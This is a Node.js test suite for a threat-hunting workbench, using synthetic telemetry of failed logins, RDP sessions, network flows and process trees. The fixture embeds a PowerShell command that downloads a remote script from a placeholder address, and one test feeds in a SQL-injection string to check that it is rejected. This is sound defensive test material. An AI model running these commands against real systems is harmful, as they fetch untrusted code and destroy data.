import test from 'node:test';
import assert from 'node:assert/strict';
import { Store } from '../lib/store.js';
import { Domain } from '../lib/domain.js';
import { HuntWorkbench, validateSpec } from '../lib/hunt.js';

const T0 = Date.parse('2026-11-22T08:00:00.000Z'), at = m => new Date(T0 + m * 60000).toISOString();
function fixture(t) {
  const s = new Store(':memory:'); t.after(() => s.close()); let now = T0; const d = new Domain(s, { clock: () => now });
  s.run('INSERT INTO users VALUES (?,?,?,?,?)', 'analyst-a', 'analyst-a', 'fixture-not-a-password-hash', 'analyst', new Date(now).toISOString());
  const src = d.createSource('analyst-a', { name: 'Synthetic sensors', stale_seconds: 86400 }), ws = { external_id: 'ws-01', hostname: 'WS-01', os_family: 'windows', device_type: 'workstation', addresses: ['10.0.0.20'] }, srv = { external_id: 'srv-01', hostname: 'SRV-01', os_family: 'windows', device_type: 'server', addresses: ['10.0.2.5'] };
  const put = (m, id, kind, details, asset = ws) => { now = T0 + m * 60000; d.ingest('analyst-a', src.id, { schema_version: 'cg.telemetry/1', events: [{ event_id: id, kind, observed_at: at(m), asset, details }] }); };
  for (let i = 0; i < 3; i++) put(i, `af${i}`, 'auth.failed', { account: 'finance-admin', source_ip: '10.0.0.66', protocol: 'rdp' }, srv);
  put(5, 'af-other', 'auth.failed', { account: 'bob', source_ip: '10.0.0.30', protocol: 'winrm' }, srv);
  put(10, 'proc', 'endpoint.process_causality', { causality_id: 'C1', collector: { type: 'sysmon', name: 'Synthetic Sysmon', trust: 'high', evidence_ref: 'SYNTHETIC-COLLECTOR' }, window: { starts_at: at(9), ends_at: at(10) }, processes: [
    { process_id: 'p1', parent_process_id: null, image_path: 'C:\\Windows\\explorer.exe', command_line: 'explorer.exe', user_ref: 'finance-admin', started_at: at(9), signer: { status: 'signed', publisher: 'Synthetic Publisher' }, integrity: 'medium', evidence_ref: 'edr:1' },
    { process_id: 'p2', parent_process_id: 'p1', image_path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', command_line: 'powershell.exe -nop -c Invoke-WebRequest https://198.51.100.7/a.ps1', user_ref: 'finance-admin', started_at: at(9.5), signer: { status: 'signed', publisher: 'Synthetic Publisher' }, integrity: 'high', evidence_ref: 'edr:2' }],
    service_changes: [{ change_id: 's1', process_id: 'p2', service_name: 'UpdaterSvc', action: 'created', binary_path: 'C:\\ProgramData\\upd.exe', occurred_at: at(9.8), evidence_ref: 'edr:3' }], scheduled_task_changes: [],
    connections: [{ connection_id: 'c1', process_id: 'p2', direction: 'outbound', protocol: 'tcp', remote_address: '198.51.100.7', remote_port: 443, occurred_at: at(9.6), evidence_ref: 'edr:4' }] });
  const flow = (m, src, dst, port) => JSON.stringify({ TimeFlowStart: Math.floor((T0 + m * 60000) / 1000), SrcAddr: src, DstAddr: dst, SrcPort: 50000, DstPort: port, Proto: 6, Bytes: 100, Packets: 1 });
  put(20, 'flows', 'log.batch', { batch_id: 'F1', source_name: 'flows', format: 'goflow-json', lines: [flow(15, '10.0.0.20', '10.0.2.5', 445), flow(16, '10.0.0.20', '10.0.2.6', 3389), flow(17, '10.0.0.20', '198.51.100.7', 443)] });
  put(30, 'rdp', 'remote.active', { session_id: 'r1', protocol: 'rdp', source_a: { ip: '10.0.0.20', account: null }, target_b: { ip: '10.0.2.5', account: 'finance-admin' }, evidence_type: 'session_log', assessment: 'unknown', assessment_basis: 'source-report' }, srv);
  return { s, d, hunts: new HuntWorkbench(s, { clock: () => now }), setNow: m => { now = T0 + m * 60000; } };
}
const q = (entity, filters = {}, from = at(-60), to = at(40)) => ({ entity, from, to, filters });

test('hunts are declarative, time-bounded and validated (CG-116)', () => {
  const now = Date.parse(at(40));
  assert.throws(() => validateSpec({ entity: 'sql', from: at(0), to: at(1) }, now), /invalid_hunt_entity/);
  assert.throws(() => validateSpec(q('account', {}, at(10), at(0)), now), /hunt_window/);
  assert.throws(() => validateSpec(q('account', {}, '2026-01-01T00:00:00.000Z', at(0)), now), /hunt_window/);
  assert.throws(() => validateSpec(q('account', { query: "1=1; DROP TABLE events" }), now), /unknown_hunt_filter_query/);
  assert.throws(() => validateSpec(q('connection', { port: 70000 }), now), /invalid_hunt_filter_port/);
  assert.equal(validateSpec(q('account'), now).limit, 500);
});

test('time queries cover accounts, processes, connections, movement and changes (CG-116)', t => {
  const { hunts, setNow } = fixture(t); setNow(40);
  const acc = hunts.run(q('account', { account: 'finance-admin' }));
  assert.deepEqual(acc.rows.map(r => r.kind), ['auth.failed', 'auth.failed', 'auth.failed', 'remote.active']); assert.equal(acc.top.ip[0].value, '10.0.0.66');
  assert.equal(hunts.run(q('account', { account: 'finance-admin' }, at(1), at(40))).total, 3, 'rows outside the window are excluded');
  const proc = hunts.run(q('process', { contains: 'Invoke-WebRequest' })); assert.equal(proc.total, 1); assert.match(proc.rows[0].process, /powershell\.exe$/);
  const conn = hunts.run(q('connection', { ip: '198.51.100.7' })); assert.deepEqual(conn.rows.map(r => r.kind).sort(), ['endpoint.process_causality', 'log.batch']);
  assert.equal(hunts.run(q('connection', { port: 445 })).total, 1);
  const move = hunts.run(q('movement', { host: '' })); assert.deepEqual(move.rows.map(r => `${r.ip}>${r.dst_ip}:${r.port ?? ''}`), ['10.0.0.20>10.0.2.5:445', '10.0.0.20>10.0.2.6:3389', '10.0.0.20>10.0.2.5:'], 'internet traffic is not movement');
  const ch = hunts.run(q('change')); assert.deepEqual(ch.rows.map(r => r.summary), ['service UpdaterSvc created']);
  assert.match(acc.result_sha256, /^[a-f0-9]{64}$/); assert.ok(acc.timeline.length >= 1);
});

test('hunts are saved with notes tied to evidence and frozen into reports with the result hash (CG-116)', t => {
  const { hunts, s, setNow } = fixture(t); setNow(40);
  const h = hunts.save('analyst-a', { name: 'Finance admin abuse', hypothesis: 'The finance admin account is used from an unusual workstation', query: q('account', { account: 'finance-admin' }) });
  const ev = s.get("SELECT id FROM events WHERE external_id='rdp'").id;
  assert.throws(() => hunts.note('analyst-a', h.id, { text: 'x', event_refs: ['nope'] }), /hunt_note_references_unknown_event/);
  setNow(41); hunts.note('analyst-a', h.id, { text: 'Three failures then an RDP session from WS-01', event_refs: [ev] });
  setNow(42); const r = hunts.report('analyst-a', h.id, { conclusion: 'Escalate to an incident case' });
  assert.equal(r.result.total, 4); assert.equal(r.notes[0].event_refs[0], ev); assert.equal(r.conclusion, 'Escalate to an incident case'); assert.deepEqual(hunts.getReport(r.report_id).result.result_sha256, r.result.result_sha256);
  const saved = hunts.get(h.id); assert.equal(saved.notes.length, 1); assert.equal(saved.reports[0].rows_total, 4); assert.equal(hunts.list()[0].reports, 1);
  assert.throws(() => s.run("UPDATE hunt_notes SET text='changed'"), /hunt_notes_append_only/); assert.throws(() => s.run("UPDATE hunt_reports SET rows_total=0"), /hunt_reports_immutable/);
  assert.deepEqual(s.all("SELECT action FROM audit WHERE action LIKE 'hunt.%' ORDER BY seq").map(x => x.action), ['hunt.saved', 'hunt.note', 'hunt.report']);
});
